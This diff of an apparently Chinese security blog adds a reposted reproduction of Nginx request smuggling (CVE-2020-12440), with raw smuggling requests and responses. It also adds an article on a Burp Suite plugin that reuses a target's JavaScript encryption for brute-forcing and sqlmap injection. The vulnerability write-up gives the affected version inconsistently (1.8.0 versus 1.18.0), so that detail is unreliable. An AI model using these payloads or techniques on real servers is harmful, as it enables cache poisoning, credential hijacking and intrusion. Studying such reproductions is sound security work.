@@ -86,6 +86,151 @@
 
     
         <h2 class="title">
+            <a href="/2024/05/21/CVE-2020-12440-Nginx/">
+                （CVE-2020-12440）Nginx \&lt;= 1.8.0 请求走私
+            </a>
+        </h2>
+    
+    <time>
+        May 21, 2024
+    </time>
+    <section class="content">
+        <h1><span id="cve-2020-12440nginx-ltx3d-180-请求走私">（CVE-2020-12440）Nginx &lt;&#x3D; 1.8.0 请求走私</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Nginx/%EF%BC%88CVE-2020-12440%EF%BC%89Nginx%20%3C%3D%201.8.0%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">nosafer</a> 并作补充</p>
+</blockquote>
+<h2><span id="一-漏洞简介">一、漏洞简介</span></h2><blockquote>
+<p>Nginx 1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。</p>
+</blockquote>
+<h2><span id="二-漏洞影响">二、漏洞影响</span></h2><blockquote>
+<p>Nginx &lt;&#x3D; 1.8.0</p>
+</blockquote>
+<h2><span id="三-复现过程">三、复现过程</span></h2><blockquote>
+<p><img src="/2024/05/21/CVE-2020-12440-Nginx/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="request">Request</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.0-sec.org</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="keyword">GET</span> <span class="string">/poc.html</span> <span class="meta">HTTP/1.1</span></span></span><br><span class="line"><span class="language-http"><span class="attribute">Host</span><span class="punctuation">: </span>www.0-sec.org</span></span><br><span class="line"><span class="language-http"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="response">Response</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.18.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 01 May 2020 18:28:44 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>33</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Thu, 30 Apr 2020 14:36:32 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;5eaae270-21&quot;</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="section">&lt;html&gt;</span><span class="section">&lt;h1&gt;</span><span class="attribute">Test</span> Page!&lt;/h1&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="language-apache"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">200</span> OK</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Server</span>: nginx/<span class="number">1</span>.<span class="number">18</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Date</span>: Fri, <span class="number">01</span> May <span class="number">2020</span> <span class="number">18</span>:<span class="number">28</span>:<span class="number">44</span> GMT</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: text/html</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">15</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Last</span>-Modified: Thu, <span class="number">30</span> Apr <span class="number">2020</span> <span class="number">14</span>:<span class="number">35</span>:<span class="number">41</span> GMT</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br><span class="line"><span class="language-apache"><span class="attribute">ETag</span>: <span class="string">&quot;5eaae23d-f&quot;</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Ranges: bytes</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">NGINX</span> PoC File</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2><span id="其他例子">其他例子</span></h2><h3><span id="request200-ok-405-method-not-allowed">Request（200 OK + 405 Method Not Allowed）</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.0-sec.org</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">46</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">TRACE</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>:www.<span class="number">0</span>-sec.org</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length:<span class="number">15</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">kk</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0s</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="response200-ok-405-method-not-allowed">Response（200 OK + 405 Method Not Allowed）</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.18.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 21 Apr 2020 16:28:12 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>612</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Tue, 21 Apr 2020 16:08:59 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;5e9f1a9b-264&quot;</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-tag">body</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">width</span>: <span class="number">35em</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">font-family</span>: Tahoma, Verdana, Arial, sans-serif;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>If you see this page, the nginx web server is successfully installed and</span></span><br><span class="line"><span class="language-xml">working. Further configuration is required.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>For online documentation and support please refer to</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.org/&quot;</span>&gt;</span>nginx.org<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">Commercial support is available at</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.com/&quot;</span>&gt;</span>nginx.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>Thank you for using nginx.<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">HTTP/1.1 405 Not Allowed</span></span><br><span class="line"><span class="language-xml">Server: nginx/1.18.0</span></span><br><span class="line"><span class="language-xml">Date: Tue, 21 Apr 2020 16:28:12 GMT</span></span><br><span class="line"><span class="language-xml">Content-Type: text/html</span></span><br><span class="line"><span class="language-xml">Content-Length: 157</span></span><br><span class="line"><span class="language-xml">Connection: close</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>405 Not Allowed<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>405 Not Allowed<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx/1.18.0<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="request200-ok-404-not-found">Request（200 OK + 404 Not Found）</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.0-sec.org</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">46</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>:www.<span class="number">0</span>-sec.org</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length:<span class="number">15</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">kk</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0s</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="response200-ok-404-not-found">Response（200 OK + 404 Not Found）</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.18.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 21 Apr 2020 16:23:52 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>612</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Tue, 21 Apr 2020 16:08:59 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;5e9f1a9b-264&quot;</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-tag">body</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">width</span>: <span class="number">35em</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">font-family</span>: Tahoma, Verdana, Arial, sans-serif;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>If you see this page, the nginx web server is successfully installed and</span></span><br><span class="line"><span class="language-xml">working. Further configuration is required.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>For online documentation and support please refer to</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.org/&quot;</span>&gt;</span>nginx.org<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">Commercial support is available at</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.com/&quot;</span>&gt;</span>nginx.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>Thank you for using nginx.<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">HTTP/1.1 404 Not Found</span></span><br><span class="line"><span class="language-xml">Server: nginx/1.18.0</span></span><br><span class="line"><span class="language-xml">Date: Tue, 21 Apr 2020 16:23:52 GMT</span></span><br><span class="line"><span class="language-xml">Content-Type: text/html</span></span><br><span class="line"><span class="language-xml">Content-Length: 153</span></span><br><span class="line"><span class="language-xml">Connection: keep-alive</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx/1.18.0<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/05/21/JSFlash-BurpSuite/">
+                BurpSuite作为代理，复用目标站点的js代码处理指定的内容
+            </a>
+        </h2>
+    
+    <time>
+        May 21, 2024
+    </time>
+    <section class="content">
+        <h1><span id="burpsuite作为代理复用目标站点的js代码处理指定的内容">BurpSuite作为代理，复用目标站点的js代码处理指定的内容</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/247374.html">thinkoaa</a> 并作补充</p>
+</blockquote>
+<h2><span id="0x01-前言">0x01 前言</span></h2><blockquote>
+<p>之前写了一个burp插件，直接使用目标站点的加密js来解决用intruder模块爆破时的payload加密问题</p>
+<p>地址：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/242363.html">https://www.freebuf.com/sectool/242363.html</a></p>
+<p>除了上面的情况外，有时还会遇到把burp当作代理，调用网站的js代码处理来自浏览器、sqlmap等工具的内容情况。</p>
+<p>比如目标网站的参数调用了js加密算法，不管是手动访问也好，还是sqlmap注入也好，需要调用指定算法处理参数，用python或java重写算法的话呢，时间成本太高，有些算法还挺复杂……但，如果能够直接复用目标网站的js代码的话就太方便了。</p>
+<p>因此，简单写了一个burp suite插件，专门解决上述问题：下载地址：<a target="_blank" rel="noopener" href="https://github.com/thinkoaa/JSFlash/">JSFlash</a></p>
+<p>使用步骤是  可以参考我之前另一个插件的文章 <a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/242363.html">参考地址</a>：</p>
+<ol>
+<li>1.把目标站点的相关js代码放到本地js文件中，调试可用；</li>
+<li>2.把JSFlash插件导入到Burp Suite中，在插件中加载指定的js文件并填写对应的参数；</li>
+<li>3.抓包发repeater做测试，如果效果符合预期，则该插件会根据指定的规则，调用js代码，处理指定的内容。</li>
+</ol>
+<p>效果图：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="0x02-使用方法">0x02 使用方法</span></h2><h3><span id="1从目标站点复制修改或者手动写好js代码调试正确">1.从目标站点复制修改或者手动写好js代码，调试正确</span></h3><blockquote>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/2.png" alt="image"></p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/3.png" alt="image"></p>
+<p>因为插件是通过java调用js，因此window、document等对象及方法，还有一些很新的js特性可能在浏览器中执行正确，但插件调用时会报错，因此插件会把可能产生的错误信息弹出显示，方便根据实际逻辑修改，根据我的经历来看，不管多复杂，只要耐心点，没有改不了的情况，如图：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/4.png" alt="image"></p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/5.png" alt="image"></p>
+<p>再举一个例：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/6.png" alt="image"></p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/7.png" alt="image"></p>
+</blockquote>
+<h3><span id="2导入插件设置参数">2.导入插件，设置参数</span></h3><blockquote>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/8.png" alt="image"></p>
+<p>2.1 设置url，一定要用burp的Copy URL菜单复制，不要手动填写，以免出错：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/9.png" alt="image"></p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/10.png" alt="image"></p>
+<p>2.2 设置处理指定内容的规则</p>
+<p>GET方式:</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/11.png" alt="image"></p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/12.png" alt="image"></p>
+<p>php代码如图：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/13.png" alt="image"></p>
+<p>处理结果：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/14.png" alt="image"></p>
+<p>POST方式：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/15.png" alt="image"></p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/16.png" alt="image"></p>
+<p>php代码如图：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/17.png" alt="image"></p>
+<p>结果如图：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/18.png" alt="image"></p>
+<p>一次调用多个方法，处理多个指定内容：</p>
+<p>数据包：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/19.png" alt="image"></p>
+<p>规则：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/20.png" alt="image"></p>
+<p>php代码：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/21.png" alt="image"></p>
+<p>结果：</p>
+<p><img src="/2024/05/21/JSFlash-BurpSuite/22.png" alt="image"></p>
+</blockquote>
+<h2><span id="0x03-总结">0x03 总结</span></h2><blockquote>
+<p>这个插件用到的时候，需要具体情况具体分析，不过思路是这么个思路，目的就是复用js代码，提高工作效率。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/BurpSuite/" rel="tag">BurpSuite</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/05/14/JS-Signature/">
                 JS逆向-数据包解签名实战案例
             </a>
@@ -877,227 +1022,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shadowsocks/" rel="tag">Shadowsocks</a><a class="tag-none-link" href="/tags/V2ray/" rel="tag">V2ray</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/29/Shadowsocks-GFW-Defend/">
-                防御GFW主动探测的实用指南
-            </a>
-        </h2>
-    
-    <time>
-        Jan 29, 2024
-    </time>
-    <section class="content">
-        <h1><span id="防御gfw主动探测的实用指南">防御GFW主动探测的实用指南</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://gfw.report/blog/ss_advise/zh/">Great Firewall Report</a> 并作补充</p>
-<p>在近期的IMC’20的工作中(<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/paper/shadowsocks.pdf">论文</a>, <a target="_blank" rel="noopener" href="https://gfw.report/talks/imc20/zh/">演讲</a>)，我们揭示了中国的防火长城采用<em>流量分析</em>与<em>主动探测</em>相结合的手段来检测和封锁Shadowsocks服务器。</p>
-<p>在这篇短文中，我们将分别向技术小白和翻墙软件开发者提供防御GFW主动探测的实用建议。 我们还将介绍Len et al.展示的<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/sec21summer_len.pdf#page=13">partitioning oracle攻击</a>的缓解办法。 如果在遵循了本文的建议后，你的Shadowsocks服务器仍被封锁，请将封锁情况<a target="_blank" rel="noopener" href="https://gfw.report/">汇报给GFW Report</a>以及相应的开发者。</p>
-</blockquote>
-<h2><span id="给用户的建议">给用户的建议</span></h2><blockquote>
